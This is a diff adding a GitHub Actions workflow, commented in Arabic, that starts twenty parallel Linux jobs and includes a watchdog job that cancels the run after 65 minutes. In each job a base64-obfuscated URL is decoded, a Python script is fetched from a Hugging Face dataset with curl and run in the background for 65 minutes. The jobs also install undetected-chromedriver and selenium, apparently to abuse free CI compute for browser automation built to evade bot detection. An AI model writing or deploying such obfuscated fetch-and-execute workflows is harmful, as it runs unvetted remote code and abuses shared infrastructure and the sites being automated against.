@@ -1,0 +1,107 @@
+name: Linux Symmetric Task Squad
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: symmetric-squad-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # وكيل الإزالة النهائية: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  final-removal-agent:
+    name: "Final Removal Agent"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Enforce Terminal Removal Command
+        run: |
+          echo "[AGENT] Final removal agent on post. Terminal clearance armed at the 65-minute checkpoint."
+          echo "[AGENT] Verifying workflow token: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[AGENT] Checkpoint confirmed! Enforcing terminal removal command..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[AGENT] Terminal removal command enforced. Every functioning and waiting unit will be cleared."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الفرقة
+  # =================================================================
+  assemble-squad:
+    name: "SquadUnit-${{ matrix.unit_index }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      # ⤷ المرحلة (١): بناء الأرضية التشغيلية
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      - name: Construct Operating Groundwork
+        run: |
+          echo "[CONSTRUCT] Constructing operating groundwork for SquadUnit-${{ matrix.unit_index }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      # ⤷ المرحلة (٢): استيلاء على الملف التنفيذي
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      - name: Confiscate Execution Payload
+        run: |
+          echo "[CONFISCATE] Confiscating app_task.py from designated repository hub..."
+          REPOSITORY_HUB=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$REPOSITORY_HUB" -o app_task.py
+          echo "[CONFISCATE] Execution payload confiscated successfully."
+
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      # ⤷ المرحلة (٣): تزويد المكتبات الداعمة
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      - name: Furnish Supportive Libraries
+        run: |
+          echo "[FURNISH] Furnishing supportive libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      # ⤷ المرحلة (٤): التنفيذ المقيّد بالمدة (65 دقيقة)
+      # ✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜✜
+      - name: Undertake Captive Operation
+        run: |
+          echo ">> Assembling SquadUnit-${{ matrix.unit_index }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          SQUAD_PID=$!
+          
+          echo ">> Captive operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $SQUAD_PID 2>/dev/null; then
+            echo ">> Captive window elapsed! Retiring operation..."
+            kill -9 $SQUAD_PID
+            echo ">> Operation retired by captivity keeper."
+          else
+            echo ">> Operation closed within captive window."
+          fi
